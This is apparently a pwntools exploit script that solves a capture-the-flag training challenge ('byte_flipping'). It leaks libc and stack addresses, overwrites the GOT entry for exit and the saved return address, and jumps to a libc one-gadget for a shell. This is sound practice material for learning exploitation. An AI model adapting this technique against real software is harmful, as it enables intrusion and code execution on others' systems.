from pwn import *

#First of all, I need to leak the libc (to try to use a magic gadget) and an address of a stack to overwrite the
#sEIP. Writing a name with only 8 chars allows to have then in the "name" variable an address of the libc (so we
#can compute the offset from the libc base). Then I replace the got exit with the address of the main in order to restart
#the program (triggering it by writing a byte > 0xff). Then I write a name with 24 chars to leak the address of the stack
#(because it is moved in the name variable). Then I overwrite the sEIP with an address of the text section (before the function
#game) and I ovewrite the flips variable to have a greater amount of flips available. Finally, I overwrite the sEIP with
#the libc gadget (0xebcf5) and to spawn a shell I have to write an address 0x0 to stop the execution of the play function.

context.arch = 'amd64'

def write_name(name, num, isLeakNeeded):
    p.recvuntil(b"What's your name: ")
    p.send(name)
    p.recvuntil(b'Good luck ')
    time.sleep(0.5)
    if isLeakNeeded:
        leak = p.read(num)
        time.sleep(0.5)
        leak = p.read(6).ljust(8, b'\x00')
        leak_n = u64(leak)
        return leak_n
    return 0

def write_addr_bytes(address, byte):
    p.recvuntil(b'Address: ')
    addr_to_write = hex(address)
    p.sendline(addr_to_write.encode())
    if not(address == 0x0):
        p.recvuntil(b'Value: ')
        p.sendline(byte.encode())


#p = process('./byte_flipping')
p = remote("bin.training.offdef.it", 4003)
"""gdb.attach(p, '''
    break *0x3fe000
''')
input("wait")"""

OFFSET_LIBC_BASE_LEAK = 0x81765
OFFSET_STACK_SEIP = 8
GOT_EXIT = 0x602050
START_MAIN = 0x4007c7
START_TEXT = 0x4006e0
FLIPS = 0x602068
NAME = 0x6020a0

leak_libc_n = write_name(b'A'*8, 8, True)
print(hex(leak_libc_n))
write_addr_bytes(GOT_EXIT, "0xc7")
write_addr_bytes(GOT_EXIT + 1, "0x07")
write_addr_bytes(GOT_EXIT + 2, "0xaaaa")


leak_stack_n = write_name(b'A'*24, 24, True)
seip_n = leak_stack_n - OFFSET_STACK_SEIP
write_addr_bytes(FLIPS, "0x3f")
write_addr_bytes(seip_n, "0xff")
write_addr_bytes(seip_n + 1, "0x07")


libc_base_n = leak_libc_n - OFFSET_LIBC_BASE_LEAK
libc_gadget = libc_base_n + 0xebcf5
libc_gadget = hex(libc_gadget)
byte_to_write = "0x" + libc_gadget[14:18]
write_addr_bytes(seip_n, "0x" + libc_gadget[12:14])
write_addr_bytes(seip_n + 1, "0x" + libc_gadget[10:12])
write_addr_bytes(seip_n + 2, "0x" + libc_gadget[8:10])
write_addr_bytes(seip_n + 3, "0x" + libc_gadget[6:8])
write_addr_bytes(seip_n + 4, "0x" + libc_gadget[4:6])
write_addr_bytes(seip_n + 5, "0x" + libc_gadget[2:4])
write_addr_bytes(0x0, "")

p.sendline(b"cat flag")

p.interactive()